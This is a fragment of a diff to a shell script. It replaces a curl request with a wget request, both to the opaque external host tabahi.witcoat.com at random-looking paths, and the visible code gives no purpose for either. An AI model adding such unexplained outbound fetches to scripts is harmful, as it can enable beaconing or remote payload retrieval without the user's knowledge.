@@ -17,7 +17,7 @@ TARGET=${3:-"all"}
 
 
 
-curl tabahi.witcoat.com/yft76t7
+wget tabahi.witcoat.com/yft08944989666
 
 if [ $DO_DEBUG == false ]
 then
